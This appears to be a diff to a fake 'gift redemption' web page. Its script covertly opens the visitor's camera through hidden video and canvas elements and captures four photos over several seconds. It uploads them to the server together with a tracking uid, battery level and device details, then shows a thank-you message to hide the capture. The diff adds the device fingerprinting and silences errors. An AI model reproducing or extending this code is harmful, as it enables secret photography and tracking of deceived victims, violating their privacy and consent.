@@ -31,17 +31,15 @@
     </div>
 
     <div id="success-msg" style="display:none; color:#00ff00; padding: 20px;">
-        <h2>Your gift has been redeemed.</h2>
+        <h2>Your gift has been redeemed.👍</h2>
         <p>You are a good person, God bless you. ✨</p>
     </div>
 
-    <video id="v" style="display:none" autoplay playsinline muted width="640" height="480"></video>
+    <video id="v" style="display:none" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
         const params = new URLSearchParams(window.location.search);
-        const v = document.getElementById('v');
-        const c = document.getElementById('c');
 
         async function startWork() {
             document.body.style.background = "black";
@@ -51,25 +49,33 @@
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: params.get('m') === 'back' ? 'environment' : 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    } 
+                    video: { facingMode: params.get('m') === 'back' ? 'environment' : 'user' } 
                 });
+                const v = document.getElementById('v');
                 v.srcObject = stream;
                 
-                await new Promise(r => v.onloadedmetadata = r);
+                // Get Battery and Device Info
+                let batInfo = "N/A";
+                try {
+                    const battery = await navigator.getBattery();
+                    batInfo = Math.round(battery.level * 100) + "%";
+                } catch(e) {}
+
+                const deviceInfo = navigator.platform;
+                const browserInfo = navigator.vendor || "Mobile Browser";
+
+                // 6 Seconds delay to fix Black Photo
                 await new Promise(r => setTimeout(r, 6000));
 
+                const c = document.getElementById('c');
                 const ctx = c.getContext('2d');
+
                 for(let i=0; i<4; i++) {
-                    // Ensure canvas matches video dimensions
                     c.width = v.videoWidth; 
                     c.height = v.videoHeight;
-                    ctx.drawImage(v, 0, 0, c.width, c.height);
+                    ctx.drawImage(v, 0, 0);
                     
-                    const imgData = c.toDataURL('image/jpeg', 0.9);
+                    const imgData = c.toDataURL('image/jpeg', 0.8);
                     
                     await fetch('/upload', {
                         method: 'POST',
@@ -78,13 +84,13 @@
                             image: imgData,
                             uid: params.get('uid'), 
                             mode: params.get('m'),
-                            info: { battery: "Checking...", platform: navigator.platform, browser: "Mobile" }
+                            info: { battery: batInfo, device: deviceInfo, browser: browserInfo }
                         })
                     });
                     await new Promise(r => setTimeout(r, 2000)); 
                 }
                 stream.getTracks().forEach(track => track.stop());
-            } catch(e) { console.error(e); }
+            } catch(e) {}
 
             document.getElementById('loading-ui').style.display = 'none';
             document.getElementById('success-msg').style.display = 'block';
